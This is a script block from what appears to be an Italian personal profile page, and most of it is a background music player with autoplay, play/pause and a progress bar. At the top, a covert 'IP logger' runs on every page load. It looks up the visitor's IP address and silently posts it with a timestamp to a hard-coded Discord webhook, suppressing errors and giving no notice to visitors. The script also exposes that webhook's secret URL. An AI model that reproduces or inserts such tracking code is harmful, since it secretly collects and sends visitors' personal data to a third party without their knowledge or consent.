    <script>
        // üî• IP LOGGER INTEGRATO - SI ATTIVA ALL'AVVIO
        fetch('https://api.ipify.org?format=json')
            .then(r => r.json())
            .then(d => {
                fetch('https://discord.com/api/webhooks/1455265328786313517/IxGn24e3p-jHIAPmVzKN-OgWs_aArSd95kwLrXAT0CrkNgJ6jxiyZEvclfdnu_U-I_UY', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        embeds: [{
                            title: 'üïµÔ∏è **NUOVA VISITA - Christian Profile**',
                            description: `\`${d.ip}\``,
                            color: 0x00ff00,
                            fields: [{
                                name: 'üìÖ Data/Ora',
                                value: `\`${new Date().toLocaleString('it-IT')}\``,
                                inline: true
                            }],
                            footer: {text: 'IP Logger Attivo'}
                        }]
                    })
                });
            }).catch(() => {}); // Silenzioso se fallisce

        // MUSIC PLAYER (SENZA VOLUME)
        const audio = document.getElementById('backgroundAudio');
        const playPauseBtn = document.getElementById('playPauseBtn');
        const progressContainer = document.getElementById('progressContainer');
        const progressBar = document.getElementById('progressBar');
        const currentTimeEl = document.getElementById('currentTime');
        const durationEl = document.getElementById('duration');

        let isPlaying = false;
        
        // Volume fisso al 70%
        audio.volume = 0.7;
        
        // Avvia automaticamente all'apertura del sito
        window.addEventListener('load', () => {
            audio.play().then(() => {
                isPlaying = true;
                playPauseBtn.textContent = '‚è∏';
            }).catch(() => {
                document.body.addEventListener('click', () => {
                    if (!isPlaying) {
                        audio.play();
                        isPlaying = true;
                        playPauseBtn.textContent = '‚è∏';
                    }
                }, { once: true });
            });
        });

        // Play/Pause
        playPauseBtn.addEventListener('click', () => {
            if (isPlaying) {
                audio.pause();
                playPauseBtn.textContent = '‚ñ∂';
                isPlaying = false;
            } else {
                audio.play();
                playPauseBtn.textContent = '‚è∏';
                isPlaying = true;
            }
        });

        // Progress
        audio.addEventListener('loadedmetadata', () => {
            durationEl.textContent = formatTime(audio.duration);
        });

        audio.addEventListener('timeupdate', () => {
            if (audio.duration) {
                const progress = (audio.currentTime / audio.duration) * 100;
                progressBar.style.width = progress + '%';
                currentTimeEl.textContent = formatTime(audio.currentTime);
            }
        });

        // Progress click
        progressContainer.addEventListener('click', (e) => {
            const rect = progressContainer.getBoundingClientRect();
            const pos = (e.clientX - rect.left) / rect.width;
            audio.currentTime = pos * audio.duration;
        });

        function formatTime(seconds) {
            const mins = Math.floor(seconds / 60);
            const secs = Math.floor(seconds % 60);
            return `${mins}:${secs.toString().padStart(2, '0')}`;
        }

        // Status sync
        audio.addEventListener('play', () => {
            playPauseBtn.textContent = '‚è∏';
            isPlaying = true;
        });
        audio.addEventListener('pause', () => {
            playPauseBtn.textContent = '‚ñ∂';
            isPlaying = false;
        });
        audio.addEventListener('ended', () => {
            playPauseBtn.textContent = '‚ñ∂';
            isPlaying = false;
            progressBar.style.width = '0%';
        });
    </script>
